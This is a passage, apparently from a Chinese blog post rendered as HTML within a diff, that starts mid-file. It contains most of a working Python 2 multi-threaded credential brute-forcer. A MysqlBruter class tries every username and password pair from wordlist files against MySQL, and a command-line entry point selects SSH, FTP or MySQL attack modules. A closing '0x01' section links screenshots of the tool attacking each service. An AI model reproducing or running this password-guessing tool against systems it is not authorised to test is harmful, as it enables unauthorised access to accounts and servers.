+</span></span><span style="display:flex;"><span>                error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[Error] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (name,pwd)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,error)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>get_queue()
+</span></span><span style="display:flex;"><span>        starttime <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        threads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,self<span style="color:#f92672">.</span>threadnum<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>thread)
+</span></span><span style="display:flex;"><span>            threads<span style="color:#f92672">.</span>append(t)
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>) <span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出</span>
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>empty():
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>is_exit <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Exit the program...&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Waiting...&#34;</span>
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>show_result(self<span style="color:#f92672">.</span>host,self<span style="color:#f92672">.</span>result)
+</span></span><span style="display:flex;"><span>        finishetime <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Used time: </span><span style="color:#e6db74">%f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (finishetime<span style="color:#f92672">-</span>starttime)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#################MySQL爆破模块#################</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MysqlBruter</span>(CommonFun):
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;docstring for MysqlBruter&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self, <span style="color:#f92672">*</span>args):
+</span></span><span style="display:flex;"><span>        super(MysqlBruter, self)<span style="color:#f92672">.</span>__init__()
+</span></span><span style="display:flex;"><span>        (options,arg) <span style="color:#f92672">=</span> args
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>host <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>host
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>userfile <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>userfile
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>passfile <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>passfile
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>threadnum <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>threadnum
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>timeout <span style="color:#f92672">=</span> options<span style="color:#f92672">.</span>timeout
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>result <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>set_log(self<span style="color:#f92672">.</span>host)
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>qlist <span style="color:#f92672">=</span> Queue<span style="color:#f92672">.</span>Queue()
+</span></span><span style="display:flex;"><span>        print self<span style="color:#f92672">.</span>host,self<span style="color:#f92672">.</span>userfile,self<span style="color:#f92672">.</span>passfile,self<span style="color:#f92672">.</span>threadnum
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_queue</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>userfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            ulines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(self<span style="color:#f92672">.</span>passfile, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>            plines <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> name <span style="color:#f92672">in</span> ulines:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> pwd <span style="color:#f92672">in</span> plines:
+</span></span><span style="display:flex;"><span>                name <span style="color:#f92672">=</span> name<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                pwd <span style="color:#f92672">=</span> pwd<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>put(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">thread</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>empty():
+</span></span><span style="display:flex;"><span>            name,pwd <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>get()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>                conn <span style="color:#f92672">=</span> MySQLdb<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>host, user<span style="color:#f92672">=</span>name, passwd<span style="color:#f92672">=</span>pwd, db<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;mysql&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">3306</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> conn:
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># time.sleep(0.05)</span>
+</span></span><span style="display:flex;"><span>                    conn<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>                s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[OK] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (name,pwd)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,s)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>result<span style="color:#f92672">.</span>append(s)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> socket<span style="color:#f92672">.</span>timeout:
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,<span style="color:#e6db74">&#34;Timeout&#34;</span>)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>put(name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;:&#39;</span> <span style="color:#f92672">+</span> pwd)
+</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">3</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
+</span></span><span style="display:flex;"><span>                error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;[Error] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (name,pwd)
+</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>show_log(self<span style="color:#f92672">.</span>host,error)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>get_queue()
+</span></span><span style="display:flex;"><span>        starttime <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        threads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">1</span>,self<span style="color:#f92672">.</span>threadnum<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>thread)
+</span></span><span style="display:flex;"><span>            threads<span style="color:#f92672">.</span>append(t)
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>setDaemon(<span style="color:#66d9ef">True</span>) <span style="color:#75715e">#主线程完成后不管子线程有没有结束，直接退出</span>
+</span></span><span style="display:flex;"><span>            t<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>qlist<span style="color:#f92672">.</span>empty():
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>is_exit <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            print <span style="color:#e6db74">&#34;Exit the program...&#34;</span>
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Waiting...&#34;</span>
+</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>show_result(self<span style="color:#f92672">.</span>host,self<span style="color:#f92672">.</span>result)
+</span></span><span style="display:flex;"><span>        finishetime <span style="color:#f92672">=</span> time<span style="color:#f92672">.</span>time()
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;Used time: </span><span style="color:#e6db74">%f</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (finishetime<span style="color:#f92672">-</span>starttime)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> OptionParser(usage<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Usage: python %prog [options] type&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-i&#39;</span>,<span style="color:#e6db74">&#39;--host&#39;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;host&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;target ip&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-o&#39;</span>,<span style="color:#e6db74">&#39;--timeout&#39;</span>,type<span style="color:#f92672">=</span>int,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;timeout&#39;</span>,default<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;timeout&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-t&#39;</span>,<span style="color:#e6db74">&#39;--thread&#39;</span>,type<span style="color:#f92672">=</span>int,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;threadnum&#39;</span>,default<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;threadnum&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-L&#39;</span>,<span style="color:#e6db74">&#39;--userfile&#39;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;userfile&#39;</span>,default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username.txt&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;userfile&#39;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-P&#39;</span>,<span style="color:#e6db74">&#39;--passfile&#39;</span>,dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;passfile&#39;</span>,default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password.txt&#39;</span>,help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;passfile&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    (options, args) <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> args:
+</span></span><span style="display:flex;"><span>        parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>        exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;ssh&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>host:
+</span></span><span style="display:flex;"><span>            ssh <span style="color:#f92672">=</span> SshBruter(options, args)
+</span></span><span style="display:flex;"><span>            ssh<span style="color:#f92672">.</span>run()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;ftp&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>host:
+</span></span><span style="display:flex;"><span>            ftp <span style="color:#f92672">=</span> FtpBruter(options, args)
+</span></span><span style="display:flex;"><span>            ftp<span style="color:#f92672">.</span>run()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;mysql&#39;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>host:
+</span></span><span style="display:flex;"><span>            mysql <span style="color:#f92672">=</span> MysqlBruter(options, args)
+</span></span><span style="display:flex;"><span>            mysql<span style="color:#f92672">.</span>run()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            parser<span style="color:#f92672">.</span>print_help()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print <span style="color:#e6db74">&#34;type must be ssh or ftp or mysql&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h3 id="0x01-尝试爆破">0x01 尝试爆破</h3>
+<p><img src="/img/post/bruter_help.png" alt="帮助信息"></p>
+<p><img src="/img/post/bruter_ssh.png" alt="爆破SSH"></p>
+<p><img src="/img/post/bruter_ftp.png" alt="爆破FTP"></p>
+<p><img src="/img/post/bruter_mysql.png" alt="爆破MySQL"></p>
 </div>
     </article>
   </main>
